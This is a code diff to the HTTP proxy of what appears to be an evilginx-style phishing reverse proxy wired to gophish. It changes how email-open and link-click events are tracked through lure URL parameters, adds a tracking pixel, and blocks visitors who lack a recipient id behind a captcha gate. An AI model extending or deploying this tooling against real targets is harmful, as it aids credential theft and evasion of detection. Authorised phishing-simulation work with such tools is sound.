@@ -240,38 +240,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				//req_path += "?" + req.URL.RawQuery
 			}
 
-			// Handle clicked link and email opened events
-			rid := ""
-			browser := map[string]string{}
-			ridr, _ := regexp.Compile(`client_id=([^\"]*)`)
-			trackr, _ := regexp.Compile(`track\?client_id=`)
-			rid_match := ridr.FindString(req_url)
-			opened_match := trackr.FindString(req_url)
-			//log.Debug("Track regex", trackr.FindString(req_url))
-			//log.Debug("Rid regex", ridr.FindString(req_url))
-			if len(rid_match) != 0 && len(opened_match) == 0 {
-				rid = strings.Split(rid_match, "=")[1]
-				browser = map[string]string{"address": req.RemoteAddr, "orig-address": from_ip, "user-agent": req.UserAgent()}
-				err := database.HandleClickedLink(rid, browser, p.livefeed)
-				if err != nil {
-					log.Error("failed to add clicked link event to database: %s", err)
-				}
-			} else if len(rid_match) != 0 && len(opened_match) != 0 {
-				rid = strings.Split(rid_match, "=")[1]
-				browser = map[string]string{"address": req.RemoteAddr, "orig-address": from_ip, "user-agent": req.UserAgent()}
-				err := database.HandleEmailOpened(rid, browser, p.livefeed)
-				if err != nil {
-					log.Error("failed to add email opened event to database: %s", err)
-				}
-			}
-
-			//log.Debug("http: %s", req_url)
-
-			remote_addr := from_ip
-
 			pl := p.getPhishletByPhishHost(req.Host)
-			//parts := strings.SplitN(req.RemoteAddr, ":", 2)
-			//remote_addr := parts[0]
+			remote_addr := from_ip
 
 			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
 			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")
@@ -435,14 +405,49 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 								session, err := NewSession(pl.Name)
 								if err == nil {
+									// set params from url arguments
+									p.extractParams(session, req.URL)
+
+									// Debug - iterate over the map and print each key-value pair
+									/*for key, value := range session.Params {
+										fmt.Printf("%s: %s\n", key, value)
+									}*/
+
+									if trackParam, ok := session.Params["o"]; ok {
+										if trackParam == "track" {
+											// gophish email tracker image
+											rid, ok := session.Params["rid"]
+											if ok && rid != "" {
+												session.RId = rid
+												browser := map[string]string{"address": req.RemoteAddr, "orig-address": from_ip, "user-agent": req.UserAgent()}
+												session.Browser = browser
+												err := database.HandleEmailOpened(rid, browser, p.livefeed)
+												if err != nil {
+													log.Error("failed to add email opened event to database: %s", err)
+												}
+												log.Info("[gophish] [%s] email opened: %s (%s)", hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
+												return p.trackerImage(req)
+											}
+										}
+									}
+
 									sid := p.last_sid
 									p.last_sid += 1
 									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
-									session.RId = rid
-									session.Browser = browser
+
+									rid, ok := session.Params["rid"]
+									if ok && rid != "" {
+										session.RId = rid
+										browser := map[string]string{"address": req.RemoteAddr, "orig-address": from_ip, "user-agent": req.UserAgent()}
+										session.Browser = browser
+										err := database.HandleClickedLink(rid, browser, p.livefeed)
+										if err != nil {
+											log.Error("failed to add clicked link event to database: %s", err)
+										}
+									}
 
 									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
 									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
@@ -459,9 +464,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									session.PhishLure = l
 									log.Debug("redirect URL (lure): %s", session.RedirectURL)
 
-									// set params from url arguments
-									p.extractParams(session, req.URL)
-
 									ps.SessionId = session.Id
 									ps.Created = true
 									ps.Index = sid
@@ -470,8 +472,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									req_ok = true
 									if p.turnstile {
 										//fmt.Println("Redirecting to turnstile")
-										// Redirect to the turnstile page
-										return p.redirectTurnstile(req, session.RId)
+										// Redirect to the turnstile page if we successfully extracted a RId
+										if session.RId != "" {
+											return p.redirectTurnstile(req, session.RId)
+										} else {
+											return p.blockRequest(req)
+										}
 									}
 								}
 							} else {
@@ -509,8 +515,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if s, ok := p.sessions[ps.SessionId]; ok {
 						if p.turnstile {
 							if !s.IsCaptchaDone {
-								// Redirect to the turnstile page
-								p.redirectTurnstile(req, s.RId)
+								// Redirect to the turnstile page if we successfully extracted a RId
+								if s.RId != "" {
+									p.redirectTurnstile(req, s.RId)
+								} else {
+									return p.blockRequest(req)
+								}
 							}
 						}
 						l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
@@ -1391,6 +1401,14 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 	return req, nil
 }
 
+func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Response) {
+	resp := goproxy.NewResponse(req, "image/png", http.StatusOK, "")
+	if resp != nil {
+		return req, resp
+	}
+	return req, nil
+}
+
 func (p *HttpProxy) redirectTurnstile(req *http.Request, rid string) (*http.Request, *http.Response) {
 	resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 	if resp != nil {
@@ -1498,44 +1516,46 @@ func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
 				} else {
 					log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
 				}
+			} else {
+				log.Debug("extractParams: %s", err)
 			}
 		}
 	}
 	/*
-	   for k, v := range vals {
-	       if len(k) == 2 {
-	           // possible rc4 encryption key
-	           if len(v[0]) == 8 {
-	               enc_key = v[0]
-	               break
-	           }
-	       }
-	   }
+		   for k, v := range vals {
+			   if len(k) == 2 {
+				   // possible rc4 encryption key
+				   if len(v[0]) == 8 {
+					   enc_key = v[0]
+					   break
+				   }
+			   }
+		   }
 
-	   if len(enc_key) > 0 {
-	       for k, v := range vals {
-	           if len(k) == 3 {
-	               enc_vals, err := base64.RawURLEncoding.DecodeString(v[0])
-	               if err == nil {
-	                   dec_params := make([]byte, len(enc_vals))
+		   if len(enc_key) > 0 {
+			   for k, v := range vals {
+				   if len(k) == 3 {
+					   enc_vals, err := base64.RawURLEncoding.DecodeString(v[0])
+					   if err == nil {
+						   dec_params := make([]byte, len(enc_vals))
 
-	                   c, _ := rc4.NewCipher([]byte(enc_key))
-	                   c.XORKeyStream(dec_params, enc_vals)
+						   c, _ := rc4.NewCipher([]byte(enc_key))
+						   c.XORKeyStream(dec_params, enc_vals)
 
-	                   params, err := url.ParseQuery(string(dec_params))
-	                   if err == nil {
-	                       for kk, vv := range params {
-	                           log.Debug("param: %s='%s'", kk, vv[0])
+						   params, err := url.ParseQuery(string(dec_params))
+						   if err == nil {
+							   for kk, vv := range params {
+								   log.Debug("param: %s='%s'", kk, vv[0])
 
-	                           session.Params[kk] = vv[0]
-	                       }
-	                       ret = true
-	                       break
-	                   }
-	               }
-	           }
-	       }
-	   }*/
+								   session.Params[kk] = vv[0]
+							   }
+							   ret = true
+							   break
+						   }
+					   }
+				   }
+			   }
+		   }*/
 	return ret
 }
 
